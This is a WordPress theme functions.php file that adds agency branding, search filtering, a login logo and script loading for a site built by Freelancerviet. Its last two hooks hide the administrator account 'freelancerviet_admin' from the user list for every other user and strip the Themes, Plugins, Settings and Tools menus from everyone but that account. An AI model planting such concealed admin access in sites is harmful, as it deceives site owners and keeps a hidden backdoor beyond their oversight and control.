<?php
define('PARENT_THEME', get_template_directory() . '/inc/builder/shortcodes');

include 'functions/auto-save-image.php';


function remove_footer_admin()
{
    echo '<span id="footer-thankyou">Developed by <a href="https://freelancerviet.net">Freelancerviet.net</a></span>';
}

add_filter('admin_footer_text', 'remove_footer_admin');


add_action('admin_bar_menu', 'add_top_link_to_admin_bar', 1);
function add_top_link_to_admin_bar($admin_bar)
{
    // add a parent item
    $args = array(
        'id' => 'freelancerviet',
        'title' => 'Freelancerviet.net',
        'href' => 'https://freelancerviet.net/', // Showing how to add an external link
    );
    $admin_bar->add_node($args);

    // add a child item to our parent item
    $args = array(
        'parent' => 'freelancerviet',
        'id' => 'freelancerviet-home',
        'title' => 'Trang chủ',
        'href' => 'https://freelancerviet.net/',
        'meta' => false
    );
    $admin_bar->add_node($args);

    // add a child item to our parent item
    $args = array(
        'parent' => 'freelancerviet',
        'id' => 'freelancerviet-support',
        'title' => 'Hỗ trợ',
        'href' => 'https://freelancerviet.net/lien-he',
    );
    $admin_bar->add_node($args);
}


function search_filter($query)
{
    if (!is_admin() && $query->is_main_query()) {
        if ($query->is_search) {
            $query->set('post_type', array('post'));
            $query->set('posts_per_page', 12);
        }
    }
}

add_action('pre_get_posts', 'search_filter');


function wpb_login_logo_url()
{
    return home_url();
}

add_filter('login_headerurl', 'wpb_login_logo_url');


function remove_admin_bar_links()
{
    global $wp_admin_bar;

    $wp_admin_bar->remove_menu('updates');          // Remove the updates link
    $wp_admin_bar->remove_menu('comments');         // Remove the comments link
    $wp_admin_bar->remove_menu('wp-logo');          // Remove the comments link
//    $wp_admin_bar->remove_menu('flatsome_panel');   // Remove the comments link
}

add_action('wp_before_admin_bar_render', 'remove_admin_bar_links');


// custom css and js
add_action('admin_enqueue_scripts', 'my_scripts_method');
function my_scripts_method()
{
    wp_enqueue_style('boot_css', get_stylesheet_directory_uri() . '/assets/admin.css');
    wp_enqueue_script('script', get_stylesheet_directory_uri() . '/assets/admin.js', array('jquery'), 1.1, true);
}

add_filter('use_block_editor_for_post', '__return_false', 10);
add_action('login_head', 'my_scripts_method');

function add_theme_scripts() {
    wp_enqueue_script( 'script', get_stylesheet_directory_uri() . '/assets/client.js', array ( 'jquery' ), 1.1, true);
}
add_action( 'wp_enqueue_scripts', 'add_theme_scripts' );

function tp_custom_logo()
{ ?>
<style type="text/css">
#login h1 a {
    background-image: url(<?php echo get_theme_mod( 'site_logo' );
    ?>);
    background-size: contain;
    width: 100%;
    height: 110px;
    margin: 0;
}
</style>
<?php }

add_action('login_enqueue_scripts', 'tp_custom_logo');


//* Hide this administrator account from the users list
add_action('pre_user_query', 'dt_pre_user_query');
function dt_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'freelancerviet_admin') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'freelancerviet_admin'", $user_search->query_where);
    }
}


function remove_menus(){  

    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'freelancerviet_admin') {
        remove_menu_page( 'themes.php' );               
        remove_menu_page( 'plugins.php' );             
        remove_menu_page( 'options-general.php' );      
        remove_menu_page( 'edit-comments.php' );   
        remove_menu_page( 'tools.php' );
        remove_menu_page( 'edit.php?post_type=blocks' );   
    }
  
  }  
  add_action( 'admin_menu', 'remove_menus' );  
